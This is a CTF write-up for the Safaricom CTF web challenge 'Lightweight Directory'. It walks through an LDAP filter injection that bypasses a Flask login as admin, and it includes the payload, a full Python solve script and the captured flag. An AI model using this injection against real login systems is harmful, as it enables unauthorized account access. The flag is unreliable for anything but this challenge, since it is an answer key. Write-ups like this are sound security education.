---
title: "Lightweight Directory"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 400
flag_format: "safctf{...}"
author: "Strawhats"
---

# Lightweight Directory

> **Category:** WEB · **Points:** 400 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: http://54.72.82.22:8070 (Werkzeug/3.1.9, Python 3.11.16)

## Recon

- `GET /` -> 302 to `/connect`. Only two routes exist: `/connect` (login form),
  `/logout`. Everything else (`/admin`, `/directory`, `/flag`, `/robots.txt`,
  `/static/js/app.js`, ...) is 404.
- `POST /connect` with bad creds returns `Log in to Directory Failed`.
- Password field has a length guard: `>= 4` chars, otherwise
  `Password length not acceptable` (checked before any lookup).
- The session cookie is a Flask session: base64 `{"username":"admin"}` once
  authenticated. Not needed to forge — the injection logs you in directly.

## Hypothesis / Exploit

Name "Lightweight Directory" => LDAP. The app builds an LDAP filter from the
username/password, classically:

    (&(uid=<username>)(userPassword=<password>))

Classic LDAP auth-bypass injection in BOTH fields (password must be >= 4 chars,
and this payload is 16 chars):

    *)(uid=*))(|(uid=*)

Resulting filter collapses to a tautology matching the first directory entry
(admin), so a 302 to `/` is returned and we get an authenticated session as
`admin`. Username value is irrelevant (admin / `*` / junk all redirect).

Notably `*aaaaaaaaa` (star + padding) does NOT bypass — only the balanced
paren payload that closes `(uid=...` early works. This matches the
`(|(...)(...))` two-clause shape.

## Post-auth

Authenticated dashboard (`/`) as admin shows two links:

- `/config-update` — "Update Your Access ID" (form `new_username`) — unused for
  the flag.
- `/audit-export` — "Open team report" — response body IS the flag:

      safctf{ef30111b835006ade7f00a9a4526d453}

## Repro

    /home/nomad/safaricom_ctf/.venv/bin/python chal/web/lightweight-directory/solve.py http://54.72.82.22:8070

`solve.py` posts the injection payload to `/connect`, then GETs `/audit-export`
and prints the flag. Verified end-to-end: prints
`safctf{ef30111b835006ade7f00a9a4526d453}`.

## Notes / dead ends

- SQLi/NoSQL payloads (`' or 1=1--`, `admin'--`) do nothing; error text is
  LDAP-flavoured ("Directory Failed").
- Plain wildcards (`admin`, `*` in password) fail because they don't satisfy
  both clauses of the AND filter; the paren-balanced payload is required.

## Solve script

`web/lightweight-directory/solve.py`:

```python
#!/usr/bin/env python3
"""Lightweight Directory (Safaricom CTF, WEB, 400 pts)

The login at /connect builds an LDAP filter from user input, roughly:

    (&(uid=<username>)(userPassword=<password>))

There is a length guard on the password (>= 4 chars). Sending the classic
LDAP auth-bypass payload in BOTH fields closes the first clause early and
injects a tautology, so the constructed filter matches the first directory
entry ("admin") and the app issues a Flask session cookie for that user:

    username = password = *)(uid=*))(|(uid=*

Filter becomes (effectively):
    (&(uid=*)(uid=*))(|(uid=*)(userPassword=*)(uid=*))

Following the redirect lands on an authenticated dashboard that exposes
/audit-export, whose response body is the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8070"
PAYLOAD = "*)(uid=*))(|(uid=*"


def main() -> int:
    s = requests.Session()

    r = s.post(
        TARGET + "/connect",
        data={"username": PAYLOAD, "password": PAYLOAD},
        allow_redirects=False,
        timeout=15,
    )
    if r.status_code != 302:
        print(f"[-] login bypass failed: HTTP {r.status_code}", file=sys.stderr)
        return 1

    r = s.get(TARGET + "/audit-export", timeout=15)
    m = re.search(r"safctf\{[0-9a-fA-F]{32}\}", r.text)
    if not m:
        m = re.search(r"safctf\{[^}]*\}", r.text)
    if not m:
        print("[-] flag not found in /audit-export", file=sys.stderr)
        print(r.text[:500], file=sys.stderr)
        return 1

    print(m.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{ef30111b835006ade7f00a9a4526d453}
```
